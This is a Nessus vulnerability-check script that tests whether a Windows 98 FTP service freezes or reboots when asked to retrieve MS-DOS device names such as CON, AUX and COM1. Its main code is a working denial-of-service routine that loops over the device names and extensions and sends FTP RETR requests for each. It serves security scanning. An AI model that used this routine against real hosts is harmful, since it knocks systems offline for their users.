#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security 
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added links to the Bugtraq message archive and Microsoft Knowledgebase
#
# This script is a copy of http_w98_devname_dos.nasl. 
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{
 script_id(10929);
 script_version("$Revision: 1.23 $");

 script_name(english:"Windows 98 FTP MS/DOS Device Name Request DoS");
 script_summary(english:"Crashes Windows 98");

 script_set_attribute(attribute:"synopsis", value:
"The remote Windows host is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to freeze or reboot Windows by reading a MS/DOS device
through FTP, using a file name like CON\CON, AUX.htm, or AUX.

An attacker may use this flaw to continuously crash the affected host,
preventing users from working properly." );
 script_set_attribute(attribute:"see_also", value:"http://support.microsoft.com/default.aspx?scid=KB;en-us;Q256015" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch from the above reference." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );

script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_copyright("This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencies("find_service1.nasl", "ftp_anonymous.nasl", "os_fingerprint.nasl");
 script_require_ports("Services/ftp", 21);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

include("global_settings.inc");
include("ftp_func.inc");

if ( report_paranoia < 2 ) exit(0);


os = get_kb_item("Host/OS");
if ( os && "Windows 9" >!< os ) exit(0);


# The script code starts here

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");

# login = "ftp";
# pass = "test@test.com";

if (! login) exit(0);

start_denial();

dev[0] = "aux";
dev[1] = "con";
dev[2] = "prn";
dev[3] = "clock$";
dev[4] = "com1";
dev[5] = "com2";
dev[6] = "lpt1";
dev[7] = "lpt2";

ext[0] = ".foo";
ext[1] = ".";
ext[2] = ". . .. ... .. .";
ext[3] = "-";

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(0);
r = ftp_recv_line(socket: soc);
ftp_close(socket: soc);
if (! r)
{
  exit(0);
}

 for (i = 0; dev[i]; i = i + 1)
 {
  d = dev[i];
  for (j = 0; ext[j]; j = j + 1)
  {
   e = ext[j];
   if (e == "-")
    name = string(d, "/", d);
   else
    name = string(d, e);
   soc = open_sock_tcp(port);
   if(soc)
   {
    if (ftp_authenticate(socket:soc, user:login, pass:pass))
    {
     port2 = ftp_pasv(socket:soc);
     soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
     req = string("RETR ", name, "\r\n");
     send(socket:soc, data:req);
     if (soc2) close(soc2);
    }
    close(soc);
   }
  }
 }


alive = end_denial();					     
if(!alive)
{
 security_hole(port);
 set_kb_item(name:"Host/dead", value:TRUE);
 exit(0);
}

# Check if FTP server is still alive
r = NULL;
soc = open_sock_tcp(port);
if (soc)
{
  r = ftp_recv_line(socket: soc);
  ftp_close(socket: soc);
}

if (! r)
{
  security_hole(port:port);
}
